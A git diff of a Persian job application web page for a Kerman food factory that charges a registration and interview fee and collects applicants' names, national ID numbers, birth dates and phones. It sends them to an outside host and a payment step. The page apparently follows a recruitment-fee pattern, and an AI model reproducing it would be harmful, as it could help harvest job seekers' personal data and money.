@@ -1,15 +1,6 @@
 <!DOCTYPE html>
 <html dir="rtl" lang="fa">
 <head>
-
-<!-- Google Tag Manager -->
-<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-})(window,document,'script','dataLayer','GTM-TWQXJ7VZ');</script>
-<!-- End Google Tag Manager -->
-
 <meta id="mtKeywords" name="KEYWORDS" content="">
 
 <meta property="og:type" content="article" />
@@ -18,10 +9,10 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 <meta property="og:site_name" content="https://mrseyed.github.io" />
 <meta property="og:title" content="آقاسیــد" />
 <meta property="og:description" content="
-استخدام کارخانه اغذیه و کیک آقاسید کرمان(تراکنش موفق)
+استخدام کارخانه اغذیه و کیک آقاسید کرمان
 " />
 <meta property="og:image" content="https://mrseyed.github.io/media/factorylogo0.png">
-<title>✱تراکنش موفق✱</title>
+<title>فرم استخدام</title>
 
 
 <meta http-equiv="Content-Type" content="text/html; charset:utf-8" />
@@ -33,12 +24,11 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
  <link rel="stylesheet" type="text/css" href="css/style.css">
  <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/fonts/all.css">
- <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/fonts/fa.min.css">
+ <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/fonts/fa.css">
  <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/fonts/icofont.min.css">
  <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/fonts/fonts.css">
- <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/css/5/bootstrap.rtl.min.css">
- <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/css/5/bootstrap-reboot.rtl.min.css">
- <link rel="stylesheet" type="text/css" href="https://mrseyed.github.io/msdata/css/5/bootstrap-grid.rtl.min.css">
+ <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+ <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 <script type="text/javascript" src="https://mrseyed.github.io/msdata/js/persian-date.js"></script>
 <script type="text/javascript" src="js/form.js"></script>
  </head>
@@ -62,7 +52,7 @@ width:390px;
 }
 .form1 {
 border: 5px ridge gold;
-border-radius: 0 20pt 0 20pt;
+border-radius: 0 30pt 0 30pt;
 width:390px;
 
 }
@@ -168,6 +158,7 @@ q {
 color:red;
 font-family:samin;
 font-weight:1000;
+font-size:16px;
 }
 textarea {
 width:95%;
@@ -284,10 +275,9 @@ background-color:orange;
 </style>
 
 <!--👥👥BODY👥👥-->
-<body dir="rtl">
+<body dir="rtl"  >
  <center>
- 
- 
+
  <div class="mrq2" >
   <table style="text-align:center" >
    <tr>
@@ -367,7 +357,7 @@ background-color:orange;
  
  <br>
  
- <form action="zp/rq.php" method="POST">
+ <form action="https://mrseyed.ct.ws/php/xml.php" method="POST" name="postform" >
 
 
 <!--  🔶🔶🔶 FORM0 🔷🔷🔷  -->
@@ -403,7 +393,7 @@ background-color:orange;
    <br>
    <span><i class="icofont-coins"></i>
 هزینه ثبت نام و قرار مصاحبه
-<q style="font-size:18px;font-family:saminbold" >25,000 تومان</q>
+<q>25,900 تومان</q>
 می‌باشد.
    </span>
    <br>
@@ -423,8 +413,14 @@ background-color:orange;
    </span>
    <br>
    <br>
+
    <hr>
    <div class="hr" ></div>
+
+
+
+
+
   </div>
   </div>
     <div onclick="form0()" class="btn btn-success" style="width:88%;margin:6px" ><i class="icofont icofont-save" style="font-size:24px;margin:5px" ></i>قبول شرایط و شروع ثبت نام</div>
@@ -534,7 +530,7 @@ function form0() {
       </td>
       <td style="color:red;margin:5px" >/</td>
       <td>
-       <input onchange="year()" type="number" min="1390" min="1360"   maxlength="4" style="width:60px" class="text2 bk" name="bdy" id="bdy" >
+       <input onchange="year()" type="number" min="1390" min="1360"  border="2px solid red"  style="width:60px" class="text2 bk" name="bdy" id="bdy" >
       </td>
      </tr>
     </table>
@@ -575,7 +571,7 @@ function form0() {
    <li id="sarbaz" style="color:blue;font-family:irsblack;font-size:16px;margin-top:20px" >
 وضعیت نظام وظیفه و کارت پایان خدمت:
     <select style="margin:1px;width:80%" id="nvazife"  class="text1 bk" disabled="disabled" >
-     <option value="" >انتخاب کنید</option>
+     <option value="جنسیت زن" >انتخاب کنید</option>
      <option>کارت پایان خدمت</option>
      <option>معافیت / معافیت غیرپزشکی</option>
      <option>معافیت / معافیت پزشکی</option>
@@ -645,6 +641,7 @@ document.getElementById("kadr").hidden=false;
   <input type="text" multiple="multiple" id="address"  class="text1" name="address" style="width:95%" >
  </li>
 </ul>
+
   </div>
    <div onclick="form1n()" class="btn btn-danger" style="width:90%;margin:10px" id="form1n" ><i class="icofont icofont-save" style="font-size:24px;margin:5px" ></i>ذخیره و ادامه</div>
  </div>
@@ -1311,7 +1308,7 @@ document.getElementById("form2").hidden=false;
    <table>
     <tr>
      <td>
-      <input type="checkbox" id="ok" onchange="accept()">
+      <input type="checkbox" id="ok" onclick="success()">
      </td>
      <td>
       <span>
@@ -1322,12 +1319,13 @@ document.getElementById("form2").hidden=false;
      </td>
     </tr>
    </table>
+
   </div>
   </form>
   <form method="GET" action="zp/rq.php" >
   <input type="hidden" id="mobile" name="mobile" >
   <input type="hidden" id="description" name="description">
-  <input type="hidden" name="pool" value="250000" >
+  <input type="hidden" name="pool" value="259000" >
   </div>
  <button disabled="disabled" id="submit"  type="submit" class="btn btn-primary" style="width:90%;margin:2px" >تایید اطلاعات و پرداخت هزینه</button><br> 
  <div onclick="form4b()" class="btn btn-success" style="width:90%;margin:1px" ><i class="icofont icofont-back" style="font-size:24px;margin:5px" ></i>صفحه قبل</div>
@@ -1424,7 +1422,7 @@ var mydemo = setInterval(
 			document.getElementById("reshte2").innerHTML=reshte;
 			document.getElementById("phone2").innerHTML=phone;
 			document.getElementById("address2").innerHTML=address;
-			document.getElementById("description").value=fname+ " " + lname + "|" + "کدملی" + idnum + "|" + "تاریخ تولد" + bday;
+			document.getElementById("description").value=fname+ " " + lname + " *** " + "کدملی" + idnum + " *** " + "تاریخ تولد" + bday + " *** " + "همراه" + phone;
 			document.getElementById("mobile").value=phone;
 
 	} , 200);
@@ -1447,6 +1445,11 @@ var data2 = setInterval(
 	 	
 	 } ,1000);
  </script>
- 
+ <script type="text/javascript">
+ var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'))
+ var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+ return new bootstrap.Tooltip(tooltipTriggerEl)
+ })
+ </script>
  <script type="text/javascript" src="js/form.js"></script>
 </body>
